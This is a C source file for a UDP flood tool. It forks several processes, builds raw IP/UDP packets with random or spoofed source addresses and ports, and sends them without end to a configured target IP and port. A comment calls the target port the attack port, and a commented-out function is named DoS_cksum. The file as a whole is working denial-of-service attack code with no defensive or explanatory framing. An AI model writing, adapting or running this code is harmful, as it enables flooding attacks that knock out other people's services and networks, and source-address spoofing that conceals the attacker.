#include <stdio.h>
#include <errno.h>
#include <string.h> //memset
#include <stdlib.h> //exit
#include "utils.h"
#include "udp.h"
#include "config.h"

Configuration config;

void udp_worker()
{
	printf("start udp\n");
	int i;
	for (i=0; i < config.udp_threads; i++) {
		//new_thread_p(udp_send, 0);
		fork_process(udp_send);
	}

}

int
udp_send( )
{
	struct ip *ipH;
	struct udphdr *udpH;

	char *packet;
	int rawsock, sport;
	struct sockaddr_in sin;	
	unsigned long saddr, daddr;
	char ip1[4], ip2[4], ip3[4], ip[4];

	int pkgsize = sizeof (struct ip) + sizeof(struct udphdr) + config.udp_pkgsize;

	packet = (char *) malloc(sizeof (struct ip) + sizeof(struct udphdr) + config.udp_pkgsize);

    ipH = (struct ip *) packet;
    udpH = (struct udphdr *) (packet + sizeof(struct ip));
    memset(packet, 0, pkgsize);

	daddr = inet_addr(config.udp_targetip);

	// ip header
	ipH->ip_v = 4; /* version */
	ipH->ip_hl = 5; /* header length */
	ipH->ip_tos = 0x00; /* type of service */
	//ipH->ip_len = pkgsize; /* total length */
	ipH->ip_ttl = 255; /* time to live */
	ipH->ip_off = 0; /* fragment offset field */
	ipH->ip_id = htons(random_int(1, 65535));  /* identification */
	ipH->ip_p = IPPROTO_UDP; /* protocol */
	ipH->ip_sum = 0; /* checksum */
	//ipH.ip_src.s_addr = saddr; /* source address */
	ipH->ip_dst.s_addr = daddr; /* dest address */
	//ipH.ip_sum = ip_sum((unsigned short*)&ipH,sizeof(ipH));//检验和

	// udp header
	//udpH.uh_sport = htons( sport ); //16位源端口
	udpH->uh_dport = htons( config.udp_targetport ); //16位目的端口
	udpH->uh_ulen = htons(sizeof(struct udphdr ) + config.udp_pkgsize); //16位UDP包长度
	//udpH.uh_sum = 0; //16位校验和
	//udpH.uh_sum = DoS_cksum((unsigned short*)&udp.udpH, pkgsize);//UDP校验和	

    sin.sin_family = AF_INET;
    //sin.sin_port = htons(53); //攻击端口
    sin.sin_addr.s_addr = daddr;	
	
    rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if( rawsock < 0 )
    {
        printf("[-]Error to open socket.\n");

        return 1;
    }	

    const int optVal = 1;

  	setsockopt(rawsock, SOL_SOCKET,SO_REUSEADDR | SO_BROADCAST, &optVal, sizeof(optVal));

    if( setsockopt( rawsock , IPPROTO_IP , IP_HDRINCL , &optVal , sizeof( optVal ) ) < 0 )
    {
        printf("[-]Error to setsockopt to the socket.\n");

        return 1;
    }
	printf("packet=%d, len=%d, pkgsize=%d\nsending ...\n", sizeof(packet), config.udp_pkgsize, pkgsize );

	while(1) 
	{
	saddr = ( strcmp(config.udp_sourceip, "*") == 0 ) ? random_lip() : inet_addr((config.udp_sourceip));
	
	sport = config.udp_sourceport == 0 ? random_int(1, 65535) : config.udp_sourceport;
	ipH->ip_id = htons(random_int(1, 65535));
	ipH->ip_src.s_addr = saddr;
	ipH->ip_sum = ip_sum((unsigned short*)&ipH, sizeof(ipH));
	udpH->uh_sport = htons( sport );
	ipH->ip_len = pkgsize;
	//udpH->uh_sum = ip_sum((unsigned short*)&udpH, sizeof(udpH));

	    if( sendto( rawsock , packet, pkgsize  , 0 , ( struct sockaddr *) &sin , sizeof(sin)) < 0 )
	    {

	        printf("[-]Error to sendto : %s[%d].\n" , strerror(errno), errno );

	        return 1;
	    }
		if (config.udp_sleeptime > 0) usleep(config.udp_sleeptime);
	}

    return 0;
     
}